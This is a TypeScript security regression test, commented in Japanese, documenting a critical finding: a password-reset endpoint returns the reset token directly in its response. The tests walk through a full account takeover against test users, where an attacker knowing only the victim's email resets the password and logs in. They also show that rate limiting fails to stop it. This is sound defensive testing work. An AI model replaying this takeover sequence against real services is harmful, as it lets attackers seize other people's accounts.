import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { prisma } from "@/lib/db";
import { callWorkerApi, createTestUser } from "./helpers/workerApi";

/**
 * T-703 AU-8関連の重大所見(docs/design/11_ADR-011 §3.2、パスワードのレート制限・
 * 資格情報回復フローの実効性)。
 *
 * app/api/auth/reset/request/route.ts(worker-apiの/internal/auth/reset-request、
 * workers/api/src/routes/internalAuth.ts)は、メール送信基盤が存在しないという
 * 理由でパスワードリセットトークンをHTTPレスポンスのJSONボディへ直接返す設計に
 * なっている。これは「メールアドレスの所有証明」というリセットフロー本来の
 * 前提を満たさないまま、対象メールアドレスを知っているだけの第三者に有効な
 * リセットトークンを発行してしまう。
 *
 * 本テストはこの経路を実際にエンドツーエンドで実行し、被害者のメールアドレスしか
 * 知らない攻撃者が(a)被害者のパスワードを変更し(b)変更後のパスワードで
 * ログインできる、という完全なアカウント乗っ取りが成立することを実証する。
 *
 * ADR-010 §5の深刻度基準に照らすと「認証バイパス」に該当しCritical(公開不可)。
 * CLAUDE.md/goal制約により修正は行わない(T-705のスコープ)。このテストは
 * 安全な期待値(=攻撃者はresetTokenを取得できない)をassertしているため、
 * 現状の実装に対しては失敗(red)する。これは意図的であり、T-705で対策された
 * 時点でgreenに転じる回帰テストとして機能する(ADR-010 §6)。詳細は
 * docs/security/findings.md参照。
 */
describe("AU-8所見: パスワードリセットトークンの直接開示(認証バイパス相当、Critical)", () => {
  beforeAll(async () => {
    await prisma.$connect();
  });
  afterAll(async () => {
    await prisma.$disconnect();
  });

  it(
    "被害者のメールアドレスしか知らない攻撃者は、reset-requestのレスポンスから" +
      "有効なresetTokenを入手できてはならない",
    async () => {
      const victim = await createTestUser();

      // 攻撃者は被害者のメールアドレス以外、何も知らない(セッションなし、
      // メールボックスへのアクセスなし)。
      const attackerResetRequest = await callWorkerApi(
        new Request("http://worker-api.internal/internal/auth/reset-request", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: victim.email }),
        }),
      );
      expect(attackerResetRequest.status).toBe(200);
      const { resetToken } = (await attackerResetRequest.json()) as { resetToken: string | null };

      // 安全な設計であれば、メールボックスの所有を証明していない呼び出し元に
      // トークンそのものは返らない(メール送信のみ・別チャネル)はずである。
      expect(resetToken).toBeNull();
    },
  );

  it(
    "【突破実証】上記の開示されたresetTokenを使い、攻撃者が被害者のパスワードを" +
      "変更したうえで新パスワードでログインできてしまう一連の流れ(現状の実装で" +
      "実際に成立することを示す。修正はT-705のスコープのため行わない)",
    async () => {
      const victim = await createTestUser();
      const attackerChosenPassword = "attacker-set-this-password-123";

      const resetRequestRes = await callWorkerApi(
        new Request("http://worker-api.internal/internal/auth/reset-request", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: victim.email }),
        }),
      );
      const { resetToken } = (await resetRequestRes.json()) as { resetToken: string | null };
      expect(resetToken, "現状の実装ではresetTokenがレスポンスに含まれる").toBeTruthy();

      const confirmRes = await callWorkerApi(
        new Request("http://worker-api.internal/internal/auth/reset-confirm", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token: resetToken, password: attackerChosenPassword }),
        }),
      );
      expect(confirmRes.status).toBe(200);

      const victimLoginWithOldPassword = await callWorkerApi(
        new Request("http://worker-api.internal/internal/auth/verify-credentials", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: victim.email, password: victim.password }),
        }),
      );
      expect(victimLoginWithOldPassword.status).toBe(401);

      const attackerLoginWithNewPassword = await callWorkerApi(
        new Request("http://worker-api.internal/internal/auth/verify-credentials", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: victim.email, password: attackerChosenPassword }),
        }),
      );
      expect(attackerLoginWithNewPassword.status).toBe(200);
      const body = (await attackerLoginWithNewPassword.json()) as { id: string };
      expect(body.id).toBe(victim.id);
    },
  );

  it("5req/min/IPのレート制限があっても、攻撃者は1回のリクエストでトークンを取得できるため実効的な緩和にならない", async () => {
    // middleware.tsのレート制限はPOST /api/auth/*(Next.js層)にのみ適用され、
    // worker-api(このテストが直接叩いている層)自体には制限がない。仮に
    // Next.js層を経由しても、この攻撃は1メールアドレスにつき1回のリクエストで
    // 完結するため、5req/minの制限は実効的な抑止力にならない(ブルートフォースを
    // 想定した制限であり、既知メールアドレスへの単発攻撃には無力)。
    const victim = await createTestUser();
    const singleAttemptRes = await callWorkerApi(
      new Request("http://worker-api.internal/internal/auth/reset-request", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: victim.email }),
      }),
    );
    const { resetToken } = (await singleAttemptRes.json()) as { resetToken: string | null };
    expect(resetToken, "1回のリクエストだけで攻撃が成立する").toBeTruthy();
  });
});
